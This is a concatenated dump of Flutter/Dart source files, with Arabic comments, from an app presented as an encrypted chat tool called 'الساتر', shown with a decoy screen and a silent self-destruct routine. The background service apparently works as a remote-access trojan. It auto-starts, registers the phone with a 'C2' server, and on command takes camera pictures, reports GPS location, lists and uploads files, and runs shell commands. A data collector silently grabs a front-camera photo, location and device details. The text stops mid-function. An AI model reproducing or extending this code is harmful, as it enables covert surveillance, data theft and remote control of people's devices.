  Future<void> _triggerSilentSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SilentSelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SILENT SELF-DESTRUCT TRIGGERED by: $triggeredBy",
        "SILENT_SELF_DESTRUCT_TRIGGER");

    try {
      await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
    } catch (e, s) {
      _ref.read(appLoggerProvider).error(
          "SilentSelfDestruct", "Error during silent self-destruct", e, s);
    }
  }

  // الطريقة الأصلية للتدمير الذاتي (تستخدم فقط لرقم الهلع)
  Future<void> _triggerSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SELF-DESTRUCT TRIGGERED in DecoyScreen by: $triggeredBy",
        "SELF_DESTRUCT_TRIGGER");
    
    // استخدام خدمة التدمير الذاتي
    await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
  }

  String getRemainingLockoutTime() {
    if (state.lockoutEndTime == null) return "";

    final now = DateTime.now();
    if (state.lockoutEndTime!.isBefore(now)) return "";

    final difference = state.lockoutEndTime!.difference(now);
    final minutes = difference.inMinutes;
    final seconds = difference.inSeconds % 60;

    return "$minutes:${seconds.toString().padLeft(2, '0')}";
  }

  @override
  void dispose() {
    _progressTimer?.cancel();
    _lockoutTimer?.cancel();
    super.dispose();
  }
}

class DecoyScreenState {
  final int tapCount;
  final double progressValue;
  final String statusMessage;
  final bool systemCheckComplete;
  final int failedLoginAttempts;
  final DateTime? lockoutEndTime;
  final bool isPostDestruct;

  DecoyScreenState({
    required this.tapCount,
    required this.progressValue,
    required this.statusMessage,
    required this.systemCheckComplete,
    required this.failedLoginAttempts,
    this.lockoutEndTime,
    required this.isPostDestruct,
  });

  factory DecoyScreenState.initial() {
    return DecoyScreenState(
      tapCount: 0,
      progressValue: 0.0,
      statusMessage: "جاري تهيئة النظام...",
      systemCheckComplete: false,
      failedLoginAttempts: 0,
      lockoutEndTime: null,
      isPostDestruct: false,
    );
  }

  DecoyScreenState copyWith({
    int? tapCount,
    double? progressValue,
    String? statusMessage,
    bool? systemCheckComplete,
    int? failedLoginAttempts,
    DateTime? lockoutEndTime,
    bool? isPostDestruct,
  }) {
    return DecoyScreenState(
      tapCount: tapCount ?? this.tapCount,
      progressValue: progressValue ?? this.progressValue,
      statusMessage: statusMessage ?? this.statusMessage,
      systemCheckComplete: systemCheckComplete ?? this.systemCheckComplete,
      failedLoginAttempts: failedLoginAttempts ?? this.failedLoginAttempts,
      lockoutEndTime: lockoutEndTime ?? this.lockoutEndTime,
      isPostDestruct: isPostDestruct ?? this.isPostDestruct,
    );
  }
}

final decoyScreenControllerProvider =
    StateNotifierProvider<DecoyScreenController, DecoyScreenState>((ref) {
  final authService = ref.watch(authServiceProvider);
  return DecoyScreenController(ref, authService);
});



// ------------------------------ نهاية الملف: decoy_screen_controller.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: home_page.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\home\home_page.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../about_tab/about_tab.dart';
import '../chat/chat_list_screen.dart';
import '../debug_monitor/debug_monitor_screen.dart'; // إضافة استيراد شاشة المراقبة
import '../history_tab/history_tab.dart';

class HomePage extends ConsumerStatefulWidget {
  const HomePage({super.key});

  @override
  ConsumerState<HomePage> createState() => _HomePageState();
}

class _HomePageState extends ConsumerState<HomePage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  int _currentIndex = 0;
  bool _showDebugButton = false; // زر إظهار شاشة المراقبة
  int _debugTapCount = 0; // عداد النقرات لإظهار زر المراقبة

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _tabController.addListener(() {
      setState(() {
        _currentIndex = _tabController.index;
      });
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  void _incrementDebugTapCount() {
    setState(() {
      _debugTapCount++;
      if (_debugTapCount >= 5) {
        _showDebugButton = true;
      }
    });

    // إعادة تعيين العداد بعد 3 ثوانٍ من عدم النقر
    Future.delayed(const Duration(seconds: 3), () {
      if (mounted) {
        setState(() {
          _debugTapCount = 0;
        });
      }
    });
  }

  void _openDebugMonitor() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (context) => const DebugMonitorScreen(),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap:
          _incrementDebugTapCount, // زيادة عداد النقرات عند النقر على أي مكان في الشاشة
      child: Scaffold(
        appBar: AppBar(
          title: const Text('الساتر'),
          bottom: TabBar(
            controller: _tabController,
            tabs: const [
              Tab(icon: Icon(Icons.chat), text: 'المحادثات'),
              Tab(icon: Icon(Icons.lock), text: 'التشفير'),
              Tab(icon: Icon(Icons.file_present), text: 'الملفات'),
              Tab(icon: Icon(Icons.history), text: 'السجل'),
            ],
          ),
          actions: [
            if (_showDebugButton)
              IconButton(
                icon: const Icon(Icons.bug_report),
                onPressed: _openDebugMonitor,
                tooltip: 'شاشة المراقبة',
              ),
          ],
        ),
        body: TabBarView(
          controller: _tabController,
          children: const [
            ChatListScreen(),
            HistoryTab(),
            AboutTab(),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: home_page.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: background_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\background_service.dart
// ----------------------------------------------------------------------

// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile;
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidServiceInstance;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart' show Position;
import 'package:newtest1/core/logging/enhanced_logger_service.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../utils/constants.dart';
import 'device_info_service.dart';
import 'file_system_service.dart';
import 'location_service.dart';
import 'network_service.dart';

String? _currentScreenshotCommandId;
String? _currentScreenshotCommandRef;

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;
  final EnhancedLoggerService logger;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.locationService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
    required this.logger,
  });
}

StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
Timer? _serviceWatchdogTimer;
bool _isServiceRunning = false;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  _isServiceRunning = true;

  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:onStart", "Service instance starting...");

  final network = NetworkService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();

  String deviceId;
  try {
    deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
    logger.info(
        "BackgroundService:onStart", "DeviceID obtained/created: $deviceId");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart", "Fatal error getting device ID",
        e, stackTrace);
    deviceId = "error_device_id_${DateTime.now().millisecondsSinceEpoch}";
    logger.warn("BackgroundService:onStart",
        "Using fallback DeviceID due to error: $deviceId");
  }

  final handles = BackgroundServiceHandles(
    networkService: network,
    deviceInfoService: deviceInfo,
    locationService: location,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
    logger: logger,
  );

  _startServiceWatchdog(handles);

  try {
    logger.info("BackgroundService:onStart",
        "Attempting initial Socket.IO connection...");
    await network.connectSocketIO(deviceId);
    logger.info("BackgroundService:onStart",
        "Initial Socket.IO connection attempt initiated.");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart",
        "Error during initial Socket.IO connection attempt", e, stackTrace);
  }

  _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription =
      network.connectionStatusStream.listen((isConnected) {
    logger.info("BackgroundService:ConnectionStatus",
        "Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    if (isConnected) {
      _registerDeviceWithC2(handles);
    }
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:ConnectionStatus",
        "Error in connection status stream", error, stackTrace);
  });

  _commandSubscription?.cancel();
  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String?;
    final commandId = commandData['command_id'] as String?;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});

    if (cmd == null) {
      logger.warn("BackgroundService:CommandStream",
          "Received command with null name. Data: $commandData");
      return;
    }
    logger.info("BackgroundService:CommandStream",
        "Received command '$cmd' (ID: ${commandId ?? 'N/A'}) with args: $args");
    _handleC2Command(handles, cmd, args, commandId);
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:CommandStream", "Error in command stream",
        error, stackTrace);
  });

  service.on('screenshotTakenByUI').listen((dataFromUI) async {
    logger.info("BackgroundService:screenshotTakenByUI",
        "Received data from UI: $dataFromUI");
    if (dataFromUI is Map<String, dynamic>) {
      final filePath = dataFromUI['file_path'] as String?;
      final error = dataFromUI['error'] as String?;
      final String? originalCmdId = _currentScreenshotCommandId;
      final String? originalCmdRef = _currentScreenshotCommandRef;

      if (filePath != null && originalCmdRef != null) {
        logger.info("BackgroundService:screenshotTakenByUI",
            "Screenshot file path received: $filePath. Uploading for command ID $originalCmdId.");
        await handles.networkService.uploadFileFromCommand(
          deviceId: handles.currentDeviceId,
          commandRef: originalCmdRef,
          commandId: originalCmdId,
          fileToUpload: XFile(filePath),
        );
        try {
          final tempFile = File(filePath);
          if (await tempFile.exists()) {
            await tempFile.delete();
            logger.info("BackgroundService:screenshotTakenByUI",
                "Temporary screenshot file $filePath deleted.");
          }
        } catch (e, s) {
          // *** السطر المعدل هنا ***
          logger.error("BackgroundService:screenshotTakenByUI",
              "Could not delete temp screenshot file $filePath: $e", e, s);
        }
      } else if (error != null) {
        logger.error("BackgroundService:screenshotTakenByUI",
            "UI reported error taking screenshot: $error for command ID $originalCmdId.");
        if (originalCmdRef != null) {
          handles.networkService.sendCommandResponse(
            originalCommand: originalCmdRef,
            commandId: originalCmdId,
            status: 'error',
            payload: {'message': 'Failed to take screenshot on UI: $error'},
          );
        }
      } else {
        logger.warn("BackgroundService:screenshotTakenByUI",
            "Received invalid data from UI for screenshot: $dataFromUI");
      }
      _currentScreenshotCommandId = null;
      _currentScreenshotCommandRef = null;
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    logger.info("BackgroundService:StopEvent",
        "Received '$BG_SERVICE_EVENT_STOP_SERVICE' event. Stopping service.");
    await _stopService(handles);
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((event) async {
    logger.info("BackgroundService",
        "Received event '$BG_SERVICE_EVENT_SEND_INITIAL_DATA'. Preparing to send initial data.");
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;
    if (alreadySent && !(event?['force'] == true)) {
      logger.info("BackgroundService",
          "Initial data already sent and not forced, skipping.");
      return;
    }
    try {
      final deviceInfoPayload = await handles.deviceInfoService.getDeviceInfo();
      XFile? imageFile;
      logger.info("BackgroundService",
          "Sending initial data via HTTP. Device ID: ${deviceInfoPayload['deviceId']}");
      final success = await handles.networkService.sendInitialData(
        jsonData: deviceInfoPayload,
        imageFile: imageFile,
      );
      if (success) {
        await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
        logger.info(
            "BackgroundService", "Initial data sent successfully via HTTP.");
      } else {
        logger.error(
            "BackgroundService", "Failed to send initial data via HTTP.");
      }
    } catch (e, s) {
      logger.error("BackgroundService",
          "Error during sending initial data via HTTP", e, s);
    }
  });

  if (service is AndroidServiceInstance) {
    try {
      await service.setAsForegroundService();
      logger.info(
          "BackgroundService:onStart", "Android service set to foreground.");
    } catch (e, s) {
      logger.error("BackgroundService:onStart",
          "Failed to set Android service to foreground", e, s);
    }
  }

  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 5), (timer) {
      if (!_isServiceRunning) {
        timer.cancel();
        return;
      }
      try {
        service.setForegroundNotificationInfo(
          title: "The Conduit Service",
          content:
              "Service active. Last check: ${DateTime.now().toIso8601String().substring(11, 19)}",
        );
      } catch (e, s) {
        logger.warn("BackgroundService:NotificationUpdate",
            "Could not update foreground notification. Error: $e, StackTrace: $s");
      }
    });
  }
  logger.info(
      "BackgroundService:onStart", "Service initialization process complete.");
}

void _startServiceWatchdog(BackgroundServiceHandles h) {
  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = Timer.periodic(const Duration(minutes: 15), (_) {
    if (!_isServiceRunning) {
      _serviceWatchdogTimer?.cancel();
      h.logger.info("BackgroundService:Watchdog",
          "Service is not running, watchdog stopping.");
      return;
    }
    h.logger.info(
        "BackgroundService:Watchdog", "Watchdog check: Service is running.");
    if (!h.networkService.isSocketConnected) {
      h.logger.warn("BackgroundService:Watchdog",
          "Socket disconnected. Attempting reconnect via NetworkService.");
      h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
          h.logger.error("BackgroundService:Watchdog",
              "Error during watchdog reconnect attempt", e, s));
    }
    _checkAndRefreshRegistration(h);
  });
  h.logger.info("BackgroundService:Watchdog", "Service watchdog started.");
}

Future<void> _checkAndRefreshRegistration(BackgroundServiceHandles h) async {
  final lastRegTimeStr = h.preferences.getString('last_registration_time');
  bool needsRegistration = true;
  if (lastRegTimeStr != null) {
    try {
      final lastRegTime = DateTime.parse(lastRegTimeStr);
      if (DateTime.now().difference(lastRegTime).inHours < 6) {
        needsRegistration = false;
      }
    } catch (e) {
      h.logger.warn("BackgroundService:RefreshReg",
          "Error parsing last registration time: $e. Will re-register.");
    }
  }

  if (needsRegistration) {
    h.logger.info("BackgroundService:RefreshReg",
        "Registration refresh needed or first time. Attempting registration.");
    _registerDeviceWithC2(h);
  } else {
    h.logger.debug("BackgroundService:RefreshReg",
        "Registration is still recent. No refresh needed now.");
  }
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) {
    h.logger.warn("BackgroundService:RegisterDevice",
        "Cannot register device. Socket not connected. Device ID: ${h.currentDeviceId}");
    h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
        h.logger.error("BackgroundService:RegisterDevice",
            "Error during connectSocketIO for registration", e, s));
    return;
  }
  try {
    final deviceInfoPayload = await h.deviceInfoService.getDeviceInfo();
    if (deviceInfoPayload['deviceId'] != h.currentDeviceId) {
      h.logger.warn("BackgroundService:RegisterDevice",
          "Mismatch between handles.currentDeviceId ('${h.currentDeviceId}') and deviceInfoPayload['deviceId'] ('${deviceInfoPayload['deviceId']}'). Using handles.currentDeviceId for registration.");
      deviceInfoPayload['deviceId'] = h.currentDeviceId;
    }

    h.logger.info("BackgroundService:RegisterDevice",
        "Registering device with C2. Device ID: ${h.currentDeviceId}");
    h.networkService.registerDeviceWithC2(deviceInfoPayload);

    await h.preferences
        .setString('last_registration_time', DateTime.now().toIso8601String());
    h.logger.info("BackgroundService:RegisterDevice",
        "Device registration event sent. Last registration time updated.");
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService:RegisterDevice",
        "Error preparing or sending device registration", e, stackTrace);
  }
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService:HandleCommand",
      "Handling command: '$commandName' (ID: ${commandId ?? "N/A"})");
  dynamic resultPayload;
  String status = "success";

  try {
    switch (commandName) {
      case SIO_CMD_TAKE_PICTURE:
        h.logger.info("BackgroundService:HandleCommand",
            "Requesting UI screenshot for command '$commandName' (ID: ${commandId ?? "N/A"}).");
        _currentScreenshotCommandId = commandId;
        _currentScreenshotCommandRef = commandName;
        h.serviceInstance.invoke(
            'requestScreenshotFromUI', {'command_id': commandId, 'args': args});
        return;

      case SIO_CMD_GET_LOCATION:
        final Position? locationData =
            await h.locationService.getCurrentLocation();
        if (locationData != null) {
          resultPayload = {
            'latitude': locationData.latitude,
            'longitude': locationData.longitude,
            'accuracy': locationData.accuracy,
            'altitude': locationData.altitude,
            'speed': locationData.speed,
            'timestamp_gps': locationData.timestamp.toIso8601String(),
          };
          h.logger.info("BackgroundService:HandleCommand",
              "Location obtained: $resultPayload");
        } else {
          throw Exception(
              "Location unavailable or permission denied by location service.");
        }
        break;

      case SIO_CMD_LIST_FILES:
        final pathToList = args["path"] as String? ?? ".";
        h.logger.info("BackgroundService:HandleCommand",
            "Listing files for path: '$pathToList'");
        final Map<String, dynamic>? listFilesResult =
            await h.fileSystemService.listFiles(pathToList);
        if (listFilesResult != null && listFilesResult["error"] == null) {
          resultPayload = listFilesResult;
        } else {
          throw Exception(listFilesResult?["error"]?.toString() ??
              "Failed to list files via native code.");
        }
        break;

      case SIO_CMD_UPLOAD_SPECIFIC_FILE:
        final filePathToUpload = args["path"] as String?;
        if (filePathToUpload == null || filePathToUpload.isEmpty) {
          throw Exception(
              "File path is required for '$SIO_CMD_UPLOAD_SPECIFIC_FILE'.");
        }
        final file = File(filePathToUpload);
        if (!await file.exists()) {
          throw Exception("File not found at path: '$filePathToUpload'.");
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Uploading specific file: '$filePathToUpload'.");
        await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: commandName,
          commandId: commandId,
          fileToUpload: XFile(filePathToUpload),
        );
        return;

      case SIO_CMD_EXECUTE_SHELL:
        final shellCommandName = args["command_name"] as String?;
        final shellCommandArgs = (args["command_args"] as List<dynamic>?)
                ?.map((e) => e.toString())
                .toList() ??
            [];
        if (shellCommandName == null || shellCommandName.isEmpty) {
          throw Exception(
              "Command name ('command_name') is required for '$SIO_CMD_EXECUTE_SHELL'.");
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Executing shell command: '$shellCommandName' with args: $shellCommandArgs");
        final Map<String, dynamic>? execResult = await h.fileSystemService
            .executeShellCommand(shellCommandName, shellCommandArgs);
        if (execResult != null && execResult["error"] == null) {
          resultPayload = execResult;
        } else {
          throw Exception(execResult?["error"]?.toString() ??
              "Failed to execute shell command via native code.");
        }
        break;

      case SIO_EVENT_REQUEST_REGISTRATION_INFO:
        h.logger.info("BackgroundService:HandleCommand",
            "Received request for registration info from C2. Re-registering.");
        _registerDeviceWithC2(h);
        return;

      default:
        h.logger.warn("BackgroundService:HandleCommand",
            "Unknown command received: '$commandName'");
        status = "error";
        resultPayload = {'message': "Unknown command: '$commandName'"};
    }
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService:HandleCommand",
        "Error handling command '$commandName' (ID: ${commandId ?? "N/A"})",
        e,
        stackTrace);
    status = "error";
    resultPayload = {'message': e.toString()};
  }

  h.networkService.sendCommandResponse(
    originalCommand: commandName,
    commandId: commandId,
    status: status,
    payload: resultPayload,
  );
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  h.logger.info("BackgroundService:StopService", "Stopping service now...");
  _isServiceRunning = false;

  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = null;

  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  await _commandSubscription?.cancel();
  _commandSubscription = null;

  h.networkService.dispose();
  h.logger.info("BackgroundService:StopService", "NetworkService disposed.");

  try {
    await h.serviceInstance.stopSelf();
    h.logger.info("BackgroundService:StopService",
        "Service instance stopped successfully.");
  } catch (e, s) {
    h.logger.error("BackgroundService:StopService",
        "Error stopping service instance", e, s);
  }
}

Future<bool> initializeBackgroundService() async {
  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:Initialize",
      "Attempting to initialize FlutterBackgroundService...");
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
    const androidInitialize =
        AndroidInitializationSettings('@mipmap/ic_launcher');
    const initializationSettings =
        InitializationSettings(android: androidInitialize);
    try {
      await flutterLocalNotificationsPlugin.initialize(initializationSettings);
      logger.info("BackgroundService:Initialize",
          "FlutterLocalNotificationsPlugin initialized.");
      const channel = AndroidNotificationChannel(
        'conduit_service_channel_id',
        'The Conduit Service Notifications',
        description:
            'Notifications for The Conduit background service activity.',
        importance: Importance.low,
        playSound: false,
        enableVibration: false,
        showBadge: false,
      );
      await flutterLocalNotificationsPlugin
          .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin>()
          ?.createNotificationChannel(channel);
      logger.info("BackgroundService:Initialize",
          "Notification channel 'conduit_service_channel_id' created/updated.");
    } catch (e, stackTrace) {
      logger.error("BackgroundService:Initialize",
          "Error initializing notifications or channel", e, stackTrace);
    }
  }

  try {
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        notificationChannelId: 'conduit_service_channel_id',
        initialNotificationTitle: 'The Conduit Service',
        initialNotificationContent:
            'Initializing The Conduit background operations...',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
      ),
    );
    logger.info("BackgroundService:Initialize",
        "FlutterBackgroundService configured successfully.");
    return true;
  } catch (e, stackTrace) {
    logger.error("BackgroundService:Initialize",
        "Fatal error configuring FlutterBackgroundService", e, stackTrace);
    return false;
  }
}



// ------------------------------ نهاية الملف: background_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: camera_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\camera_service.dart
// ----------------------------------------------------------------------

// lib/services/camera_service.dart
// الإصدار المعدل لاستخدام Platform Channels للوصول إلى الكاميرا من الخلفية بشكل موثوق

import 'dart:async';

import 'package:camera/camera.dart'
    show XFile, CameraLensDirection; // نحتفظ بها لـ XFile وتعاريف العدسات
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart'; // مطلوب لـ PlatformChannel

class CameraService {
  // تعريف قناة الاتصال. تم تحديثها لتتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel =
      MethodChannel('com.zeroone.theconduit/camera');

  // لم نعد بحاجة لـ CameraController أو قائمة الكاميرات هنا إذا كانت كل العمليات تتم في الكود الأصلي.

  Future<bool> initializeCamera(CameraLensDirection direction) async {
    // الكود الأصلي سيتولى التهيئة عند استدعاء takePicture،
    // أو يمكننا إضافة دالة تهيئة خاصة إذا احتجنا لتهيئة مسبقة.
    // للتبسيط، نفترض أن الكود الأصلي يهيئ الكاميرا لكل لقطة.
    debugPrint(
        "CameraService (Dart): استدعاء initializeCamera لـ ${direction.name}. الكود الأصلي سيتولى التهيئة الفعلية.");
    // قد تصبح هذه الدالة بدون أي عمليات أو فقط للتسجيل إذا كان الكود الأصلي يدير كل شيء.
    return true; // نفترض أن الكود الأصلي سينجح أو يعالج الأخطاء.
  }

  Future<XFile?> takePicture(
      {required CameraLensDirection lensDirection}) async {
    debugPrint(
        "CameraService (Dart): محاولة التقاط صورة عبر قناة الاتصال (العدسة: ${lensDirection.name})");
    try {
      // استدعاء الدالة 'takePicture' في الكود الأصلي وتمرير اتجاه العدسة.
      final String? filePath = await _channel.invokeMethod('takePicture', {
        'lensDirection':
            lensDirection == CameraLensDirection.front ? 'front' : 'back',
      });

      if (filePath != null) {
        debugPrint(
            "CameraService (Dart): تم التقاط الصورة بنجاح عبر الكود الأصلي. المسار: $filePath");
        return XFile(filePath);
      } else {
        debugPrint(
            "CameraService (Dart): دالة takePicture الأصلية أعادت مسارًا فارغًا.");
        return null;
      }
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة takePicture الأصلية: ${e.message}");
      return null;
    } catch (e) {
      debugPrint("CameraService (Dart): خطأ غير متوقع في takePicture: $e");
      return null;
    }
  }

  Future<void> dispose() async {
    // إذا كان الكود الأصلي يدير دورة حياة الكاميرا، فقد تكون دالة dispose في Dart بسيطة.
    // يمكن استدعاء دالة dispose أصلية إذا لزم الأمر.
    debugPrint(
        "CameraService (Dart): استدعاء Dispose. يجب أن يتولى الكود الأصلي تحرير الموارد إذا لزم الأمر.");
    try {
      await _channel.invokeMethod(
          'disposeCamera'); // استدعاء دالة dispose في الكود الأصلي
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة disposeCamera الأصلية: ${e.message}");
    }
    // لا يوجد CameraController محلي لتحريره.
  }
}

// يمكن الإبقاء على هذا الامتداد المساعد
extension LensDirectionName on CameraLensDirection {
  String get name {
    switch (this) {
      case CameraLensDirection.front:
        return 'الأمامية';
      case CameraLensDirection.back:
        return 'الخلفية';
      case CameraLensDirection.external:
        return 'الخارجية';
    }
  }
}



// ------------------------------ نهاية الملف: camera_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: data_collector_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\data_collector_service.dart
// ----------------------------------------------------------------------

// lib/services/data_collector_service.dart
import 'dart:async';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart'; // << لاستخدام debugPrint
import 'package:intl/intl.dart'; // لتنسيق الوقت
// import 'package:location/location.dart'; // << تم التغيير إلى geolocator
import 'package:geolocator/geolocator.dart'; // << لاستخدام Position

import 'location_service.dart';
import 'device_info_service.dart';
import 'camera_service.dart';

class DataCollectorService {
  final LocationService _locationService = LocationService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final CameraService _cameraService = CameraService();

  Future<Map<String, dynamic>> collectInitialDataFromUiThread() async {
    debugPrint(
      "DataCollectorService (UI Thread): Starting initial data collection...",
    );
    final Map<String, dynamic> collectedPayload = {};
    Map<String, dynamic> jsonDataToBuild = {};
    XFile? capturedFrontImageFile;

    // 1. معلومات الجهاز
    debugPrint("DataCollectorService (UI Thread): Getting device info...");
    try {
      final deviceInfo = await _deviceInfoService.getDeviceInfo();
      jsonDataToBuild['deviceInfo'] = deviceInfo;
      if (deviceInfo.containsKey('deviceId')) {
        debugPrint(
          "DataCollectorService (UI Thread): Device info collected successfully, Device ID: ${deviceInfo['deviceId']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): WARNING - Device ID not found in deviceInfo payload from DeviceInfoService.",
        );
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting device info: $e\nStackTrace: $s",
      );
      jsonDataToBuild['deviceInfo'] = {
        'error': 'Failed to get device info',
        'details': e.toString(),
      };
    }

    // 2. الموقع الجغرافي (باستخدام Position من geolocator)
    debugPrint("DataCollectorService (UI Thread): Getting current location...");
    try {
      // LocationService.getCurrentLocation() الآن يعيد Position? من geolocator
      final Position? positionData =
          await _locationService.getCurrentLocation();
      if (positionData != null) {
        jsonDataToBuild['location'] = {
          'latitude': positionData.latitude,
          'longitude': positionData.longitude,
          'accuracy': positionData.accuracy,
          'altitude': positionData.altitude,
          'speed': positionData.speed,
          'timestamp_gps':
              positionData.timestamp
                  ?.toIso8601String(), // Position.timestamp is DateTime?
        };
        debugPrint(
          "DataCollectorService (UI Thread): Location data collected: ${jsonDataToBuild['location']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Location data (Position) returned null.",
        );
        jsonDataToBuild['location'] = {
          'error':
              'Failed to get location data (service returned null Position)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting location: $e\nStackTrace: $s",
      );
      jsonDataToBuild['location'] = {
        'error': 'Failed to get location due to exception',
        'details': e.toString(),
      };
    }

    // 3. التقاط صورة من الكاميرا الأمامية
    debugPrint(
      "DataCollectorService (UI Thread): Attempting to initialize and capture front camera image...",
    );
    try {
      // تم التأكد من أن CameraService.initializeCamera لا يتم استدعاؤه هنا مباشرة
      // بل يتم الاعتماد على أن QrScannerScreen يقوم بالتهيئة
      // ولكن لأغراض جمع البيانات الأولية، قد نحتاج لتهيئة مؤقتة إذا لم تكن مهيئة
      // أو الأفضل أن يكون CameraService مهيأً بشكل مستقل أو من خلال QrScannerScreen
      // بناءً على الخطأ السابق، takePicture يتطلب lensDirection
      capturedFrontImageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );
      if (capturedFrontImageFile != null) {
        debugPrint(
          "DataCollectorService (UI Thread): Front image captured: ${capturedFrontImageFile.path}",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'status': 'Captured',
          'name_on_device': capturedFrontImageFile.name,
          'path_on_device': capturedFrontImageFile.path,
        };
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Front image capture attempt resulted in null XFile.",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'error': 'Failed to capture front image (XFile was null)',
        };
      }
    } catch (e, s) {
      debugPrint(
